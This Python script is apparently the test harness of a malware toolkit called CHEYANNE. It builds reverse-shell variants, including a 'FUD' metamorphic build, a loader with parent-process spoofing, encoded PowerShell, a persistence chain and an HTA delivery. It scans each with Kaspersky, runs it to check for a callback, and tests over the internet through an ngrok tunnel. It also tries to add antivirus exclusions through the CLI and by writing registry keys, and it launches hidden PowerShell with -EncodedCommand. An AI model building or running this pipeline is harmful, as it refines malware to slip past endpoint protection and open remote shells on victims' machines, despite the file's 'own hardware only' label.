#!/usr/bin/env python3
import sys
sys.stdout.reconfigure(encoding='utf-8', errors='replace')
"""
test_evasion.py — Kaspersky / RTP Evasion Test Harness
22DIV / george wu — CSEC research, own hardware only

Builds every CHEYANNE evasion variant, static-scans with Kaspersky CLI,
then runs each locally and checks for TCP callback.

Usage:
    python test_evasion.py
    python test_evasion.py --port 9876
    python test_evasion.py --no-build     (reuse existing test_builds/)
    python test_evasion.py --static-only  (scan only, skip behavioral)
"""

import os, sys, socket, subprocess, threading, time, json, shutil
import argparse, glob, winreg, ctypes, ctypes.wintypes

# ── Win32 constants for ReadDirectoryChangesW ──────────────────────────────
FILE_NOTIFY_CHANGE_FILE_NAME  = 0x00000001
FILE_NOTIFY_CHANGE_SIZE       = 0x00000008
FILE_ACTION_REMOVED           = 0x00000002
FILE_ACTION_RENAMED_OLD_NAME  = 0x00000004
INVALID_HANDLE_VALUE          = ctypes.c_void_p(-1).value

ROOT       = os.path.dirname(os.path.abspath(__file__))
SHELL_DIR  = os.path.join(ROOT, "shell")
GHOST_DIR  = os.path.join(ROOT, "ghost-encoder")
GHOST_ENC  = os.path.join(GHOST_DIR, "ghost_encode.py")
BUILD_GL   = os.path.join(ROOT, "build_ghost_loader.py")
DEPLOY     = os.path.join(ROOT, "deploy.py")
METAMORPH  = os.path.join(ROOT, "metamorph.py")
MUTATE     = os.path.join(ROOT, "mutate.py")
TEST_DIR   = os.path.join(ROOT, "test_builds")
NGROK_API  = "http://127.0.0.1:4040/api/tunnels"

# ── colours ────────────────────────────────────────────────────────────────
GREEN = "\033[92m"; RED = "\033[91m"; AMBER = "\033[93m"
CYAN  = "\033[96m"; BOLD = "\033[1m"; RST   = "\033[0m"; DIM = "\033[2m"

def ok(m):   print(f"  {GREEN}[+]{RST} {m}")
def info(m): print(f"  {CYAN}[*]{RST} {m}")
def fail(m): print(f"  {RED}[!]{RST} {m}")
def warn(m): print(f"  {AMBER}[~]{RST} {m}")
def hl(c="─"): print(f"  {c*58}")
def hdr(m):
    print(); hl("═")
    print(f"  {BOLD}{CYAN}{m}{RST}")
    hl("─")

RESULTS = []   # (name, static, dynamic, notes)

# ── Kaspersky file-deletion watcher ─────────────────────────────────────────

class KavWatcher:
    """
    Watches a directory for files being deleted or renamed (quarantine move).
    Uses ReadDirectoryChangesW so we catch Kaspersky's quarantine instantly.
    """
    def __init__(self, watch_dir):
        self.watch_dir  = watch_dir
        self.deleted    = []       # list of filenames killed by KAV
        self._stop      = threading.Event()
        self._thread    = None

    def start(self):
        self._thread = threading.Thread(target=self._watch, daemon=True)
        self._thread.start()

    def stop(self):
        self._stop.set()

    def was_deleted(self, filename):
        base = os.path.basename(filename).lower()
        return any(base == d.lower() for d in self.deleted)

    def _watch(self):
        k32 = ctypes.windll.kernel32
        hDir = k32.CreateFileW(
            self.watch_dir,
            0x0001,           # FILE_LIST_DIRECTORY
            0x07,             # FILE_SHARE_READ|WRITE|DELETE
            None, 3,          # OPEN_EXISTING
            0x02000000,       # FILE_FLAG_BACKUP_SEMANTICS
            None
        )
        if hDir == INVALID_HANDLE_VALUE:
            return

        buf = ctypes.create_string_buffer(65536)
        bytes_ret = ctypes.wintypes.DWORD(0)

        while not self._stop.is_set():
            ok_ret = k32.ReadDirectoryChangesW(
                hDir, buf, len(buf), False,
                FILE_NOTIFY_CHANGE_FILE_NAME | FILE_NOTIFY_CHANGE_SIZE,
                ctypes.byref(bytes_ret), None, None
            )
            if not ok_ret:
                break
            offset = 0
            while True:
                # FILE_NOTIFY_INFORMATION layout: NextEntryOffset(4), Action(4),
                #                                 FileNameLength(4), FileName(variable)
                next_off = ctypes.c_uint32.from_buffer_copy(buf, offset).value
                action   = ctypes.c_uint32.from_buffer_copy(buf, offset + 4).value
                fn_len   = ctypes.c_uint32.from_buffer_copy(buf, offset + 8).value
                fn_raw   = buf.raw[offset + 12: offset + 12 + fn_len]
                filename = fn_raw.decode("utf-16-le", errors="replace")

                if action in (FILE_ACTION_REMOVED, FILE_ACTION_RENAMED_OLD_NAME):
                    self.deleted.append(filename)
                    print(f"\n  {RED}[KAV DELETED]{RST} {filename}")

                if next_off == 0:
                    break
                offset += next_off

        k32.CloseHandle(hDir)


# ── Kaspersky exclusion setup ────────────────────────────────────────────────

def kas_add_exclusion(kavs, path):
    """
    Try to add path to Kaspersky trusted zone via CLI.
    Returns (success: bool, msg: str)
    """
    if not kavs:
        return False, "no KAV found"
    # Try CLI ADDEXCLUSION (supported in some versions)
    try:
        r = subprocess.run(
            [kavs, "ADDEXCLUSION", f"/FILE:{path}", "/THREAT:*", "/ACTION:skip"],
            capture_output=True, text=True, encoding="utf-8", errors="replace",
            timeout=15, cwd=os.path.dirname(kavs)
        )
        if r.returncode == 0:
            return True, "CLI exclusion added"
        return False, f"CLI rc={r.returncode}: {(r.stdout+r.stderr).strip()[:120]}"
    except Exception as e:
        return False, str(e)

def kas_exclusion_via_registry(path):
    """
    Write exclusion directly to Kaspersky's registry keys.
    Kaspersky Self-Defense may block this — run as admin.
    """
    base_paths = [
        r"SOFTWARE\KasperskyLab\AVP21.3\settings\ExcludedObjects",
        r"SOFTWARE\KasperskyLab\AVP22.0\settings\ExcludedObjects",
        r"SOFTWARE\WOW6432Node\KasperskyLab\AVP21.3\settings\ExcludedObjects",
    ]
    # Try to find the actual settings key
    try:
        root = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\KasperskyLab")
        products = []
        for i in range(winreg.QueryInfoKey(root)[0]):
            products.append(winreg.EnumKey(root, i))
        winreg.CloseKey(root)
    except:
        return False, "KasperskyLab key not found"

    for prod in products:
        for suffix in [r"\settings\ExcludedObjects",
                       r"\protected\AVP\settings\ExcludedObjects"]:
            try:
                key_path = rf"SOFTWARE\KasperskyLab\{prod}{suffix}"
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path,
                                     0, winreg.KEY_SET_VALUE)
                idx = winreg.QueryInfoKey(key)[1]
                winreg.SetValueEx(key, str(idx), 0, winreg.REG_SZ, path)
                winreg.CloseKey(key)
                return True, f"registry exclusion set: {key_path}"
            except Exception as e:
                continue
    return False, "could not locate or write exclusion registry key (Self-Defense may be blocking)"


def setup_kaspersky_exclusion(kavs, test_dir):
    hdr("KASPERSKY EXCLUSION SETUP")
    info(f"Adding exclusion for: {test_dir}")

    # Method 1: CLI
    ok_cli, msg_cli = kas_add_exclusion(kavs, test_dir)
    if ok_cli:
        ok(f"CLI: {msg_cli}")
        return True
    warn(f"CLI failed: {msg_cli}")

    # Method 2: registry
    ok_reg, msg_reg = kas_exclusion_via_registry(test_dir)
    if ok_reg:
        ok(f"Registry: {msg_reg}")
        warn("Restart Kaspersky or reboot for registry exclusion to take effect")
        return True
    warn(f"Registry failed: {msg_reg}")

    # Method 3: manual instructions
    fail("Automated exclusion failed. Add it manually:")
    print(f"""
  {CYAN}Kaspersky manual exclusion steps:{RST}
  1. Open Kaspersky → Settings (gear icon)
  2. Security Settings → Threats and Exclusions
  3. Manage Exclusions → Add
  4. Add path: {test_dir}
  5. Scope: All components
  6. Status: Active → Save

  Or temporarily PAUSE protection for testing:
  Kaspersky tray icon → Pause Protection → 1 hour
""")
    return False


# ── Kaspersky scanner ────────────────────────────────────────────────────────

KAV_PATHS = [
    r"C:\Program Files (x86)\Kaspersky Lab\Kaspersky\avp.com",
    r"C:\Program Files\Kaspersky Lab\Kaspersky\avp.com",
    r"C:\Program Files (x86)\Kaspersky Lab\Kaspersky Security Cloud\avp.com",
    r"C:\Program Files\Kaspersky Lab\Kaspersky Security Cloud\avp.com",
    r"C:\Program Files (x86)\Kaspersky Lab\Kaspersky Free\avp.com",
    r"C:\Program Files\Kaspersky Lab\Kaspersky Free\avp.com",
    r"C:\Program Files (x86)\Kaspersky Lab\Kaspersky Anti-Virus\avp.com",
    r"C:\Program Files\Kaspersky Lab\Kaspersky Anti-Virus\avp.com",
    r"C:\Program Files\Kaspersky Lab\Kaspersky Plus\avp.com",
    r"C:\Program Files\Kaspersky Lab\Kaspersky Standard\avp.com",
]

def find_kaspersky():
    for p in KAV_PATHS:
        if os.path.exists(p):
            return p
    for g in glob.glob(r"C:\Program Files*\Kaspersky Lab\**\avp.com", recursive=True):
        return g
    # registry fallback
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                             r"SOFTWARE\KasperskyLab")
        for i in range(winreg.QueryInfoKey(key)[0]):
            sub = winreg.EnumKey(key, i)
            try:
                sub2 = winreg.OpenKey(key, sub + r"\environment")
                path, _ = winreg.QueryValueEx(sub2, "ProductFolder")
                candidate = os.path.join(path, "avp.com")
                if os.path.exists(candidate):
                    return candidate
            except:
                pass
    except:
        pass
    return None

def kas_scan(kavs, filepath):
    """Returns ('CLEAN'|'DETECTED'|'ERROR'|'SKIP', detail_str)"""
    if not kavs:
        return "SKIP", "no KAV found"
    try:
        r = subprocess.run(
            [kavs, "SCAN", filepath, "/i0"],
            capture_output=True, text=True, encoding="utf-8", errors="replace",
            timeout=45, cwd=os.path.dirname(kavs)
        )
        out = (r.stdout + r.stderr).strip()
        rc  = r.returncode
        import re
        m = re.search(r';\s*Total detected:\s*(\d+)', out, re.IGNORECASE)
        if m:
            total = int(m.group(1))
            if total == 0:
                return "CLEAN", f"Total detected: 0  rc={rc}"
            for line in out.splitlines():
                lo = line.lower()
                if any(k in lo for k in ("detected","threat","virus","malware")) \
                        and "total detected" not in lo and "stat" not in lo:
                    return "DETECTED", line.strip()[:120]
            return "DETECTED", f"Total detected: {total}  rc={rc}"
        # Fallback: rc=0 = clean
        if rc == 0:
            return "CLEAN", f"rc=0"
        for line in out.splitlines():
            lo = line.lower()
            if any(k in lo for k in ("detected","threat","virus","malware")) \
                    and "total detected" not in lo:
                return "DETECTED", line.strip()[:120]
        return "ERROR", f"rc={rc} {out[:80]}"
    except subprocess.TimeoutExpired:
        return "ERROR", "scan timeout"
    except Exception as e:
        return "ERROR", str(e)[:80]

# ── ngrok ────────────────────────────────────────────────────────────────────

def get_ngrok():
    try:
        import urllib.request
        data = json.loads(urllib.request.urlopen(NGROK_API, timeout=3).read())
        t = data.get("tunnels", [])
        if t:
            url = t[0]["public_url"]
            h, p = url.replace("tcp://", "").rsplit(":", 1)
            return h, int(p)
    except:
        pass
    return None, None

def ensure_ngrok(local_port):
    h, p = get_ngrok()
    if h:
        ok(f"ngrok active: {h}:{p} -> localhost:{local_port}")
        return h, p
    info("Starting ngrok tcp tunnel...")
    subprocess.Popen(["ngrok", "tcp", str(local_port)],
                     creationflags=subprocess.CREATE_NEW_CONSOLE)
    for _ in range(8):
        time.sleep(1)
        h, p = get_ngrok()
        if h:
            ok(f"ngrok started: {h}:{p} -> localhost:{local_port}")
            return h, p
    fail("ngrok failed to start")
    return None, None

# ── TCP callback listener ────────────────────────────────────────────────────

class CallbackListener:
    def __init__(self, port):
        self.port    = port
        self.event   = threading.Event()
        self.peer    = None
        self._thread = None
        self._srv    = None

    def start(self):
        self._thread = threading.Thread(target=self._listen, daemon=True)
        self._thread.start()
        time.sleep(0.3)

    def _listen(self):
        try:
            self._srv = socket.socket()
            self._srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self._srv.settimeout(25)
            self._srv.bind(("0.0.0.0", self.port))
            self._srv.listen(5)
            conn, addr = self._srv.accept()
            self.peer = addr
            conn.close()
            self._srv.close()
            self.event.set()
        except:
            pass

    def wait(self, timeout):
        return self.event.wait(timeout)

    def stop(self):
        try:
            if self._srv:
                self._srv.close()
        except:
            pass

# ── build helpers ─────────────────────────────────────────────────────────────

def run_silent(cmd, **kw):
    return subprocess.run(cmd, capture_output=True, text=True,
                          encoding="utf-8", errors="replace",
                          cwd=ROOT, **kw)

def build_baseline():
    info("Building baseline (vader_shell standard)...")
    run_silent([sys.executable, DEPLOY, "--compile"])
    src = os.path.join(SHELL_DIR, "vader_shell.exe")
    if not os.path.exists(src):
        fail("vader_shell.exe not produced"); return None
    dst = os.path.join(TEST_DIR, "t_baseline.exe")
    shutil.copy2(src, dst)
    ok(f"Baseline -> {os.path.basename(dst)}")
    return dst

def build_fud():
    info("Building FUD (metamorph + mutate + compile)...")
    run_silent([sys.executable, METAMORPH, "--target", "shell", "--intensity", "3"])
    run_silent([sys.executable, MUTATE])
    run_silent([sys.executable, DEPLOY, "--compile"])
    src = os.path.join(SHELL_DIR, "vader_shell.exe")
    if not os.path.exists(src):
        fail("FUD build failed"); return None
    dst = os.path.join(TEST_DIR, "t_fud.exe")
    shutil.copy2(src, dst)
    ok(f"FUD -> {os.path.basename(dst)}")
    return dst

def build_ghost_loader(ip, port, v3=False):
    ver = "v3[ParentSpoof]" if v3 else "v2[Direct]"
    info(f"Building ghost_loader {ver} (target {ip}:{port})...")
    cmd = [sys.executable, BUILD_GL, ip, str(port)]
    if v3:
        cmd.append("--v3")
    run_silent(cmd)
    src = os.path.join(SHELL_DIR, "ghost_loader.exe")
    if not os.path.exists(src):
        fail(f"ghost_loader.exe ({ver}) not produced"); return None
    label = "t_ghost_loader_v3.exe" if v3 else "t_ghost_loader.exe"
    dst = os.path.join(TEST_DIR, label)
    shutil.copy2(src, dst)
    ok(f"Ghost Loader {ver} -> {os.path.basename(dst)}")
    return dst

def build_ghost_ps1(ip, port, method="iex"):
    info(f"Building ghost PS1 (--method {method}, {ip}:{port})...")
    out = os.path.join(TEST_DIR, f"t_ghost_{method}.ps1")
    env = os.environ.copy(); env["PYTHONIOENCODING"] = "utf-8"
    run_silent([sys.executable, GHOST_ENC, "--shell", ip, str(port),
                "--method", method, "-o", out], env=env, cwd=GHOST_DIR)
    if not os.path.exists(out):
        fail(f"ghost PS1 ({method}) not produced"); return None
    ok(f"Ghost PS1 ({method}) -> {os.path.basename(out)}")
    return out

def build_vader_chain(ip, port):
    info(f"Building VADER chain (persist+shell+screen, {ip}:{port})...")
    out = os.path.join(TEST_DIR, "t_vader_chain.ps1")
    env = os.environ.copy(); env["PYTHONIOENCODING"] = "utf-8"
    run_silent([sys.executable, GHOST_ENC, "--vader", ip, str(port),
                "-o", out], env=env, cwd=GHOST_DIR)
    if not os.path.exists(out):
        fail("VADER chain build failed"); return None
    ok(f"VADER chain -> {os.path.basename(out)}")
    return out

def build_ghost_hta(ip, port):
    info(f"Building ghost HTA delivery ({ip}:{port})...")
    ps1 = os.path.join(TEST_DIR, "_hta_payload.ps1")
    hta = os.path.join(TEST_DIR, "t_ghost.hta")
    env = os.environ.copy(); env["PYTHONIOENCODING"] = "utf-8"
    run_silent([sys.executable, GHOST_ENC, "--shell", ip, str(port), "-o", ps1],
               env=env, cwd=GHOST_DIR)
    run_silent([sys.executable, GHOST_ENC, ps1, "--deliver", "hta", "-o", hta],
               env=env, cwd=GHOST_DIR)
    if not os.path.exists(hta):
        fail("HTA build failed"); return None
    ok(f"Ghost HTA -> {os.path.basename(hta)}")
    return hta

# ── behavioral runners ────────────────────────────────────────────────────────

def run_exe(path, args=None, timeout=22):
    """Run an EXE, return (callback: bool, note: str)"""
    lsnr = CallbackListener(ARGS.port)
    lsnr.start()
    cmd = [path] + (args or [])
    try:
        proc = subprocess.Popen(cmd, creationflags=subprocess.CREATE_NO_WINDOW
                                                  | subprocess.CREATE_NEW_PROCESS_GROUP)
    except Exception as e:
        lsnr.stop()
        return False, f"launch error: {e}"
    got = lsnr.wait(timeout)
    try: proc.kill()
    except: pass
    lsnr.stop()
    if got:
        return True, f"session from {lsnr.peer}"
    return False, "no callback within timeout"

def run_ps1(path, timeout=22):
    """Run a PS1 via EncodedCommand, return (callback: bool, note: str)"""
    try:
        with open(path, "rb") as f:
            raw = f.read()
        wlen = len(raw.decode("utf-8"))
        import base64
        # Build UTF-16LE base64 for -EncodedCommand
        b64 = base64.b64encode(raw.decode("utf-8").encode("utf-16-le")).decode()
    except Exception as e:
        return False, f"encode error: {e}"

    lsnr = CallbackListener(ARGS.port)
    lsnr.start()
    cmd = ["powershell", "-NoP", "-NonI", "-W", "Hidden", "-EncodedCommand", b64]
    try:
        proc = subprocess.Popen(cmd, creationflags=subprocess.CREATE_NO_WINDOW)
    except Exception as e:
        lsnr.stop()
        return False, f"launch error: {e}"
    got = lsnr.wait(timeout)
    try: proc.kill()
    except: pass
    lsnr.stop()
    return (True, f"session from {lsnr.peer}") if got else (False, "no callback")

def run_hta(path, timeout=25):
    lsnr = CallbackListener(ARGS.port)
    lsnr.start()
    try:
        proc = subprocess.Popen(["mshta", path],
                                 creationflags=subprocess.CREATE_NEW_PROCESS_GROUP)
    except Exception as e:
        lsnr.stop()
        return False, f"mshta error: {e}"
    got = lsnr.wait(timeout)
    try: proc.kill()
    except: pass
    lsnr.stop()
    return (True, f"HTA session from {lsnr.peer}") if got else (False, "no callback")

# ── test runner ───────────────────────────────────────────────────────────────

def test_variant(name, path, run_fn, kavs, static_only=False, watcher=None):
    if not path or not os.path.exists(path):
        RESULTS.append((name, "BUILD FAIL", "N/A", "build error"))
        fail(f"{name}: build artifact missing")
        return

    print(f"\n  {CYAN}[>>] {name}{RST}  {DIM}({os.path.basename(path)}){RST}")

    # Check if KAV already deleted it before we even scanned
    time.sleep(0.5)
    if not os.path.exists(path):
        fail(f"       KAV deleted file before scan (RTP on-write detection)")
        RESULTS.append((name, "QUARANTINED", "N/A", "deleted on write by RTP"))
        return

    # static scan
    static, sdetail = kas_scan(kavs, path)

    # Re-check: did KAV delete it during scan?
    if not os.path.exists(path) or (watcher and watcher.was_deleted(path)):
        fail(f"       KAV QUARANTINED during static scan")
        RESULTS.append((name, "QUARANTINED", "N/A", "deleted during scan"))
        return

    label = {"CLEAN":    f"{GREEN}CLEAN{RST}",
             "DETECTED": f"{RED}DETECTED{RST}",
             "SKIP":     f"{AMBER}NO KAV{RST}",
             "ERROR":    f"{AMBER}ERROR{RST}"}
    print(f"       Static : {label.get(static, static)}  {DIM}{sdetail[:80]}{RST}")

    if static_only:
        RESULTS.append((name, static, "SKIPPED", sdetail[:60]))
        return

    # behavioral
    if static == "DETECTED":
        warn("       Skipping behavioral — blocked on disk")
        RESULTS.append((name, static, "SKIPPED", "AV blocked file"))
        return

    dyn, dnote = run_fn(path)

    # Post-run: did KAV kill it during execution?
    if watcher and watcher.was_deleted(path):
        fail(f"       KAV QUARANTINED during execution (System Watcher)")
        static_label = static if static != "CLEAN" else "CLEAN"
        RESULTS.append((name, static_label, "QUARANTINED@RUNTIME", "System Watcher triggered"))
        return

    dlabel = f"{GREEN}CALLBACK{RST}" if dyn else f"{RED}NO CALLBACK{RST}"
    print(f"       Dynamic: {dlabel}  {DIM}{dnote[:80]}{RST}")
    RESULTS.append((name, static, "CALLBACK" if dyn else "NO CALLBACK", dnote[:60]))

# ── report ────────────────────────────────────────────────────────────────────

def report():
    print()
    hl("═")
    print(f"  {BOLD}EVASION TEST RESULTS — KASPERSKY RTP{RST}")
    hl("─")
    print(f"  {'Variant':<26} {'Static':<12} {'Dynamic':<14} Notes")
    print(f"  {'───────':<26} {'──────':<12} {'───────':<14} ─────")
    for name, static, dynamic, notes in RESULTS:
        sc = GREEN if static == "CLEAN" else (RED if static == "DETECTED" else AMBER)
        dc = GREEN if dynamic == "CALLBACK" else (RED if "NO" in dynamic else AMBER)
        print(f"  {name:<26} {sc}{static:<12}{RST} {dc}{dynamic:<14}{RST} {DIM}{notes}{RST}")
    hl("─")
    c = sum(1 for _, s, d, _ in RESULTS if s != "DETECTED" and d == "CALLBACK")
    t = len(RESULTS)
    col = GREEN if c > 0 else RED
    print(f"\n  {col}{BOLD}{c}/{t} variants survived Kaspersky + established callback{RST}")
    hl("═")
    # save JSON
    out = os.path.join(TEST_DIR, "results.json")
    with open(out, "w", encoding="utf-8") as f:
        json.dump([{"variant": n, "static": s, "dynamic": d, "notes": x}
                   for n, s, d, x in RESULTS], f, indent=2)
    print(f"\n  {DIM}Results saved: {out}{RST}\n")

# ── main ──────────────────────────────────────────────────────────────────────

ARGS = None

def main():
    global ARGS
    p = argparse.ArgumentParser(description="CHEYANNE evasion test harness")
    p.add_argument("--port",        type=int, default=9876,
                   help="Local TCP callback port (default 9876, avoids conflict with C2 on 4443)")
    p.add_argument("--no-build",    action="store_true", help="Skip build, test existing test_builds/")
    p.add_argument("--static-only", action="store_true", help="Scan only — do not execute any binary")
    p.add_argument("--skip-ghost",  action="store_true", help="Skip ghost encoder variants")
    p.add_argument("--setup",       action="store_true",
                   help="Add test_builds/ to Kaspersky trusted zone and exit (run once on new machine)")
    ARGS = p.parse_args()

    os.makedirs(TEST_DIR, exist_ok=True)

    # ── --setup mode: exclusion only ─────────────────────────────────────────
    if ARGS.setup:
        kavs = find_kaspersky()
        setup_kaspersky_exclusion(kavs, TEST_DIR)
        return

    print(f"\n  {BOLD}{RED}=== CHEYANNE EVASION TEST HARNESS ==={RST}")
    print(f"  {DIM}Kaspersky RTP expected active. Tests run on own hardware.{RST}")
    print(f"  {DIM}Callback port: {ARGS.port}  |  test_builds/ -> {TEST_DIR}{RST}\n")

    # ── 1. Kaspersky ──────────────────────────────────────────────────────────
    hdr("STEP 1 — Kaspersky CLI")
    kavs = find_kaspersky()
    if kavs:
        ok(f"Found: {kavs}")
    else:
        warn("Kaspersky CLI (avp.com) not found — static scans will show NO KAV")
        warn("Install Kaspersky or locate avp.com manually")

    # ── 2. Ngrok ──────────────────────────────────────────────────────────────
    hdr("STEP 2 — Ngrok (WAN tunnel for external tests)")
    ngrok_h, ngrok_p = ensure_ngrok(ARGS.port)
    if ngrok_h:
        ok(f"WAN address available: {ngrok_h}:{ngrok_p}")
    else:
        warn("Ngrok unavailable — WAN test skipped, local only")

    # ── 3. Build ──────────────────────────────────────────────────────────────
    hdr("STEP 3 — Build All Variants")
    ip    = "127.0.0.1"
    port  = ARGS.port

    if ARGS.no_build:
        warn("--no-build: using existing test_builds/")
        t_base  = os.path.join(TEST_DIR, "t_baseline.exe")
        t_fud   = os.path.join(TEST_DIR, "t_fud.exe")
        t_gl    = os.path.join(TEST_DIR, "t_ghost_loader.exe")
        t_gl_v3 = os.path.join(TEST_DIR, "t_ghost_loader_v3.exe")
        t_ps1   = os.path.join(TEST_DIR, "t_ghost_iex.ps1")
        t_asm   = os.path.join(TEST_DIR, "t_ghost_assembly.ps1")
        t_vader = os.path.join(TEST_DIR, "t_vader_chain.ps1")
        t_hta   = os.path.join(TEST_DIR, "t_ghost.hta")
    else:
        t_base  = build_baseline()
        t_fud   = build_fud()
        t_gl    = build_ghost_loader(ip, port, v3=False)   # v2: direct spawn
        t_gl_v3 = build_ghost_loader(ip, port, v3=True)   # v3: parent spoof
        if not ARGS.skip_ghost:
            t_ps1   = build_ghost_ps1(ip, port, method="iex")
            t_asm   = build_ghost_ps1(ip, port, method="assembly")
            t_vader = build_vader_chain(ip, port)
            t_hta   = build_ghost_hta(ip, port)
        else:
            t_ps1 = t_asm = t_vader = t_hta = None

    # ── 4. Test ───────────────────────────────────────────────────────────────
    hdr("STEP 4 — Static + Behavioral Tests")

    # Start file deletion watcher — catches KAV quarantine events in real-time
    watcher = KavWatcher(TEST_DIR)
    watcher.start()
    info("File deletion watcher active — will catch Kaspersky quarantine events")

    test_variant("Baseline Shell",
                 t_base,
                 lambda p: run_exe(p, ["127.0.0.1", str(port)]),
                 kavs, ARGS.static_only, watcher)

    test_variant("FUD Shell (metamorph)",
                 t_fud,
                 lambda p: run_exe(p, ["127.0.0.1", str(port)]),
                 kavs, ARGS.static_only, watcher)

    test_variant("Ghost Loader v2 (direct)",
                 t_gl,
                 lambda p: run_exe(p),
                 kavs, ARGS.static_only, watcher)

    test_variant("Ghost Loader v3 (parent spoof)",
                 t_gl_v3,
                 lambda p: run_exe(p),
                 kavs, ARGS.static_only, watcher)

    if not ARGS.skip_ghost:
        test_variant("Ghost PS1 (IEX)",
                     t_ps1,
                     lambda p: run_ps1(p),
                     kavs, ARGS.static_only, watcher)

        test_variant("Ghost PS1 (Assembly/.NET)",
                     t_asm,
                     lambda p: run_ps1(p),
                     kavs, ARGS.static_only, watcher)

        test_variant("VADER Chain (persist+shell)",
                     t_vader,
                     lambda p: run_ps1(p),
                     kavs, ARGS.static_only, watcher)

        test_variant("Ghost HTA (mshta delivery)",
                     t_hta,
                     lambda p: run_hta(p),
                     kavs, ARGS.static_only, watcher)

    # ── 5. WAN test (ngrok) ───────────────────────────────────────────────────
    if ngrok_h and not ARGS.static_only:
        hdr("STEP 5 — WAN Test (ngrok) — Ghost Loader")
        info(f"Rebuilding ghost_loader for WAN: {ngrok_h}:{ngrok_p}")
        t_gl_wan = build_ghost_loader(ngrok_h, ngrok_p)
        if t_gl_wan:
            test_variant("Ghost Loader (WAN/ngrok)",
                         t_gl_wan,
                         lambda p: run_exe(p),
                         kavs, False, watcher)

    watcher.stop()

    # ── Report ────────────────────────────────────────────────────────────────
    report()


if __name__ == "__main__":
    main()
